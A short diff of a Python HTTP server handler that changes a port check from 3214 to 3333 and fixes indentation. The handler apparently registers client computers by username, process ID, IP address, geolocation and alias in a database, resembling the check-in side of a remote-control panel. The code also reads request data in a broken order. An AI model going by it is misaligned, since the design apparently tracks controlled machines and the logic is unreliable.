@@ -66,8 +66,8 @@ class Server(BaseHTTPRequestHandler):
             # data = str(self.rfile.read(int(self.headers.get('content-length'))))[2:-1]
             port = int((data.split("&")[0]).split("=")[1])
             data = str(self.rfile.read(int(self.headers.get('content-length'))))[2:-1]
-            port = 3214
-            if port == 3214:
+            
+            if port == 3333:
                 # print(port)
                 global req_head, flag
                 # req_head = str(self.rfile.read( int(self.headers.get('content-length')) ))[2:-1]
@@ -87,13 +87,13 @@ class Server(BaseHTTPRequestHandler):
                 del vals
 
                 user = req_head.get('user')
-		pid = req_head.get('pid')
-		client_ip = req_head.get('ip')
-		geo = req_head.get('geo')
-		alias = req_head.get('alias')
-		status = req_head.get('status')
+                pid = req_head.get('pid')
+                client_ip = req_head.get('ip')
+                geo = req_head.get('geo')
+                alias = req_head.get('alias')
+                status = req_head.get('status')
 		
-		if status == "register":
+                if status == "register":
                     sql = "INSERT INTO computers (alias, username, pid, ip, geo) VALUES (%s, %s, %s, %s, %s);"
                     val = (alias, user, pid, client_ip, geo)
 
